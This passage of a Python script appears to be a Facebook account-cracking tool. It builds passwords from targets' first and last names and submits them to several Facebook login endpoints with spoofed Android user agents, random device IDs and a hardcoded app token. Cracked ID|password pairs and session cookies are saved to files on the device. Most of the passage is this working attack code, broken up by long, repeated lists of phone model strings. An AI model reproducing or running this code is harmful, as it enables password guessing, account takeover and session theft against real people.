5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#
def ffb1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(f' ')[0]
        try:
            last = names.split(f' ')[1]
        except:
            last = 'FIRE'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRE=session.cookies.get_dict().keys()
            if "c_user" in FIRE:
                coki=session.cookies.get_dict()
                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m[FIRE-OK] %s | %s'%(ids,pas))
                print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in FIRE:
                if 'y' in pcp:
                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
def ffb3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(f' ')[0]
        try:
            last = names.split(f' ')[1]
        except:
            last = 'FIRE'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRE=session.cookies.get_dict().keys()
            if "c_user" in FIRE:
                coki=session.cookies.get_dict()
                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                oks.append(ids)
                break
            elif 'checkpoint' in FIRE:
                if 'y' in pcp:
                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def ffb4(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(f' ')[0]
        try:
            last = names.split(f' ')[1]
        except:
            last = 'FIRE'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRE=session.cookies.get_dict().keys()
            if "c_user" in FIRE:
                coki=session.cookies.get_dict()
                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                oks.append(ids)
                break
            elif 'checkpoint' in FIRE:
                if 'y' in pcp:
                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

def api(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(f' ')[0]
            try:
                ln = names.split(f' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                fbs=random.choice(fbks)
                gtt=random.choice(xxxxx)
                gttt=random.choice(xxxxx)
                android_version=str(random.randrange(6,13))
                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device_id = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {'adid':adid,
                    'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'device_based_login_password',
                    "source": "device_based_login",
                    'error_detail_type':'button_with_disabled',
                    'source':'login','format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1',
                    "locale":"en_US","client_country_code":"US",
                    'device':gtt,
                    'device_id':adid,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-type':'unknown',
                    'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'user-agent':ua_string,
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-friendly-name':'authenticate',
                    'accept-encoding':'gzip, deflate',
                    'x-fb-http-engine':     'Liger'}
                url = 'https://b-api.facebook.com/method/auth.login'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                    #cek_apk(session,coki)
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(f' ')[0]
            try:
                ln = names.split(f' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                application_version_code=str(random.randint(000000000,999999999))
                fbs=random.choice(fbks)
                gtt=random.choice(xxxxx)
                gttt=random.choice(xxxxx)
                android_version=str(random.randrange(6,13))
                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device_id = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {'adid':adid,
                    'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'device_based_login_password',
                    "source": "device_based_login",
                    'error_detail_type':'button_with_disabled',
                    'source':'login','format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1',
                    "locale":"es_CU","client_country_code":"CU",
                    'device':gtt,
                    'device_id':adid,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                head = {
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-type':'unknown',
                    'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'user-agent':ua_string,
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-friendly-name':'authenticate',
                    'accept-encoding':'gzip, deflate',
                    'x-fb-http-engine':     'Liger'}
                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                q = json.loads(po)
                if 'session_key' in q:
                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                    #cek_apk(session,coki)
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    if 'y' in pcp:
                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open(f'/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                        break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as e:
            pass
def ffb7(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    session = requests.Session()
    try:
        first = names.split(f' ')[0]
        try:
            last = names.split(f' ')[1]
        except:
            last = 'FIRE'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
            ua=random.choice(ugen)
            head = {'Host': 'mobile.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
            complete = session.post(f'https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
            FIRE=session.cookies.get_dict().keys()
            if "c_user" in FIRE:
                coki=session.cookies.get_dict()
                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                #cek_apk(session,coki)
                oks.append(ids)
                break
            elif 'checkpoint' in FIRE:
                if 'y' in pcp:
                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT